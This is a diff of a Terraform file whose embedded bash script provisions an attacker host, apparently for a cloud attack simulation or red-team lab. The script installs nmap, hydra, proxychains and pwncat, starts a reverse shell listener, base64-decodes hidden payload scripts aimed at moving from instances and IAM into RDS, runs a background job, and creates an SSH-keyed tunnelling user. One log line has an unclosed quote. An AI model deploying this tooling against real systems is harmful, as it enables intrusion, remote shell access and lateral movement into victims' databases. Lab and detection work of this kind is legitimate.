@@ -34,40 +34,46 @@ locals {
     else
         log "proxychains4 nmap and hydra already installed - skipping..."
     fi
-    log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
-    screen -S pwncat -X quit
-    log "cleaning app directory"
-    rm -rf ${local.attack_dir}
-    mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
-    cd ${local.attack_dir}
-    echo ${local.pwncat} | base64 -d > ${local.attack_script}
-    echo ${local.delayed_start} | base64 -d > ${local.start_script}
-    echo ${local.listener} | base64 -d > listener.py
-    echo ${local.responder} | base64 -d > plugins/responder.py
-    echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
-    echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
-    log "installing required python3.9..."
-    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
-    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
-    python3.9 get-pip.py >> $LOGFILE 2>&1
-    log "wait before using module..."
-    sleep 5
-    python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 >> $LOGFILE 2>&1
-    python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
-    log "wait before using module..."
-    sleep 5
-    log "starting background delayed script start..."
-    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
-    log "background job started"
-    if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
-        log "adding tunneled port scanning user - socksuser..."
-        adduser socksuser >> $LOGFILE 2>&1
-        log "adding ssh keys for socks user..."
-        sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
-        sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
-        sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
-        sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
-        log "socksuser setup complete..."
+    if [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; then
+        log "Pwncat session lock /tmp/pwncat_session.lock exists and pwncat screen session running. Skipping setup.
+    else
+        rm -f "/tmp/pwncat_session.lock"
+        log "Session lock doesn't exist and screen session not runing. Continuing..."
+        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
+        screen -S pwncat -X quit
+        log "cleaning app directory"
+        rm -rf ${local.attack_dir}
+        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
+        cd ${local.attack_dir}
+        echo ${local.pwncat} | base64 -d > ${local.attack_script}
+        echo ${local.delayed_start} | base64 -d > ${local.start_script}
+        echo ${local.listener} | base64 -d > listener.py
+        echo ${local.responder} | base64 -d > plugins/responder.py
+        echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
+        echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
+        log "installing required python3.9..."
+        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
+        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
+        python3.9 get-pip.py >> $LOGFILE 2>&1
+        log "wait before using module..."
+        sleep 5
+        python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 >> $LOGFILE 2>&1
+        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
+        log "wait before using module..."
+        sleep 5
+        log "starting background delayed script start..."
+        nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
+        log "background job started"
+        if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
+            log "adding tunneled port scanning user - socksuser..."
+            adduser socksuser >> $LOGFILE 2>&1
+            log "adding ssh keys for socks user..."
+            sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
+            sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
+            sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
+            sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
+            log "socksuser setup complete..."
+        fi
     fi
     log "done."
     EOT
